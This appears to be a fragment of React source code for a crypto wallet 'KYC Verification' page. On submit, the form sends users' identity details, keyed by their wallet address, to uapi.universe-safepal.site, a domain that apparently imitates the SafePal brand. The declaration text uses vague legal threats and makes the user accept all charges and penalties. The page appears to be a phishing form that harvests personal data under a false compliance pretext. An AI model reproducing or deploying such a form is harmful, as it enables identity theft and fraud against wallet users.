...
const Setting = () => {
  ...
  const handleSubmit = async (e) => {
    ...
    try {
      ...
      const response = await Axios.put(
        `https://uapi.universe-safepal.site/api/users/update/${address}`,
        formData,
      );
  ...
  return (
    <div>
      {!isUserRegistered && (
        <>
          <h1 className="text-center text-2xl">KYC Verification</h1>
          <div className="flex flex-col">
            <div className="max-w-md mx-auto">
              <div>
                KYC stands for "Know Your Customer." It is a process used by
                businesses and financial institutions to verify the identity of
                their customers. KYC verification involves collecting and
                verifying personal information about customers to ensure they
                are who they claim to be.
              </div>
              <form className="space-y-6" onSubmit={handleSubmit}>
                <section aria-labelledby="identity_details_heading">
                  <h2
                    id="identity_details_heading"
                ...
                <section aria-labelledby="declaration_heading">
                  ...
                  <p className="text-sm mb-4">
                    ...
                    is accurate and complete. I confirm that my information is
                    furnished and I comprehend that the validation of
                    registration may involve legal actions. I accept that I am
                    the responsible party for any and all charges, penalties or
                    actions.
                  </p>
                  <div className="flex items-center justify-between">
                    <button
                      type="submit"
                      className="inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 shadow shadow-input bg-background hover:bg-accent hover:text-accent-foreground h-10 px-4 py-2"
                    >
                      Sign Here
                    </button>
                  </div>
